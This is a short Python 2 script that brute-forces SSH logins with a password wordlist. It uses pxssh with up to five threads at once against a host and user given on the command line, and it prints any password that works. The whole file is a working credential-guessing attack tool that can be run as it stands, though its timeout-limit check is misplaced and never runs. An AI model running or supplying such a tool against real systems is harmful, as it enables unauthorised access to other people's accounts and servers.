#conding:utf-8
import pxssh
import optparse
import time
import threading
maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def connect(host,user,password,release):
	global Found,Fails
	try:
		s = pxssh.pxssh()
		s.login(host,user,password)
		print ('Password Found:' + password)
		Found = True
	except Exception, e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host,user,password,False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host,user,password,False)
	finally:
		if release:
			connection_lock.release()

def main():
	parser = optparse.OptionParser('usage %prog -H <targetHost> -u <user> -f <password List>')
	parser.add_option('-H',dest='tgtHost',help='specify targetHost')
	parser.add_option('-u',dest='user',help='specify user name')
	parser.add_option('-f',dest='passwdFile',help='specify password file')
	(options,args) = parser.parse_args()
	host = options.tgtHost
	user = options.user
	passwordFile = options.passwdFile
	if (host == None) or (user == None) or (passwordFile == None):
		print (parser.usage)
		exit(0)
	fp = open(passwordFile,'r')
	for line in fp.readlines():
		if Found:
			print 'exiting:Password Found'
			exit(0)
			if Fails > 5 :
				print 'exiting:too many socket timeout'
				exit(0)
		connection_lock.acquire()
		password = line.strip('\r').strip('\n')
		print ('Testind:'+ password)
		t = threading.Thread(target=connect,args=(host,user,password,True))
		t.start()

if __name__ == '__main__':
	main()